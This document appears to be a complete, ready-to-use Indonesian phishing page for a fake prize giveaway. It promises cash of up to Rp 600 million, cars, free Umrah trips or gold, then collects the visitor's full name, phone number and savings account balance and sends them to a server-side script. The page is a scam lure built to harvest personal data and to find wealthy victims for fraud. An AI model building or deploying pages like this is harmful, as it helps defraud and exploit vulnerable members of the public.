<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Kupon</title>
    <style>
        /* Mengatur Body agar benar-benar penuh 100% */
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center; /* Menjaga form tetap di tengah secara horizontal */
        }

        /* Styling Gambar Header (Penuh jika diinginkan) */
        .header-image {
            width: 100%; /* Gambar akan mengikuti lebar layar */
            max-width: 100%; 
            height: auto;
            display: block;
        }

        /* Form akan menyesuaikan lebar tapi tidak terlalu melar di layar lebar */
        form {
            width: 100%;
            max-width: 450px; /* Batas maksimal agar tidak terlalu lebar di PC */
            padding: 20px;
            box-sizing: border-box; /* Agar padding tidak menambah lebar elemen */
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
        }

        /* Input Styling mirip gambar asli */
        input[type="text"],
        input[type="tel"],
        select {
            width: 100%;
            padding: 15px;
            border: 2px solid #3474d4;
            border-radius: 10px;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
            color: #333;
        }

        select {
            background-color: #f3f3f3;
            cursor: pointer;
        }

        /* Tombol Biru Cetak */
        .btn-submit {
            width: 100%;
            background-color: #1a60be;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .btn-submit:active {
            transform: scale(0.98);
            background-color: #144b96;
        }
    </style>
</head>
<body>

<img src="1.jpg" width="100%">

    <form action="req/1.php" method="POST">
        
        <div class="form-group">
            <select name="a" required>
                <option value="" disabled selected>PILIH KUPON UNTUK ANDA</option>
                <option value="Uang Cash Rp 50-600Jt">1. Uang Cash Rp, 50-600Jt</option>
                <option value="Mobil & Motor">2. Mobil & Motor</option>
                <option value="Umroh Gratis & Paket Wisata">3. Umroh Gratis & Paket Wisata</option>
                <option value="Emas & Logam mulia">4. Emas & Logam mulia</option>
            </select>
        </div>

        <div class="form-group">
            <label>Nama Lengkap</label>
            <input type="text" name="b" placeholder="Masukkan Nama Lengkap" required>
        </div>

        <div class="form-group">
            <label>Nomor Handphone</label>
            <input type="tel" name="c" placeholder="Masukkan Nomor Handphone" required>
        </div>

        <div class="form-group">
            <label>Saldo Rekning Tabungan saat ini</label>
            <input type="text" name="d" id="saldo" placeholder="Rp." required>
        </div>

        <button type="submit" class="btn-submit">Cetak Kupon</button>
    </form>

    <script>
        // Format otomatis mata uang Rp.
        const saldoInput = document.getElementById('saldo');
        saldoInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, ''); 
            if (value !== "") {
                this.value = 'Rp. ' + value.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
            } else {
                this.value = '';
            }
        });
    </script>

</body>
</html>
